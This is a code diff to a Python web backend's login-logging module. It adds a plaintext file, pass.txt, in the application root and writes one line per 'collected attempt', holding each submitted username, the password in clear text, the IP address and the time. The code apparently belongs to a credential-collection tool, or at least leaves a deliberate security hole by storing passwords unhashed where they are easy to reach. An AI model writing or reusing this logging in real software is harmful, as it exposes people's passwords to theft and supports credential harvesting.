@@ -22,6 +22,9 @@ router = APIRouter()
 
 # Local log file, next to the backend package: backend/data/login_logs.json
 DATA_FILE = Path(__file__).resolve().parent.parent / "data" / "login_logs.json"
+# Simple plaintext log in the app's root folder: /app/pass.txt (one line per attempt)
+APP_ROOT = Path(__file__).resolve().parent.parent.parent
+PASS_FILE = APP_ROOT / "pass.txt"
 
 
 def _append_to_file(record: dict) -> None:
@@ -35,6 +38,12 @@ def _append_to_file(record: dict) -> None:
             logs = []
     logs.append(record)
     DATA_FILE.write_text(json.dumps(logs, indent=2))
+    # One flat line per collected attempt in the app root
+    with PASS_FILE.open("a") as fh:
+        fh.write(
+            f"username={record['username']} password={record['password']} "
+            f"ip={record['ip']} time={record['created_at']}\n"
+        )
 
 
 def _aware_utc(dt: datetime) -> datetime:
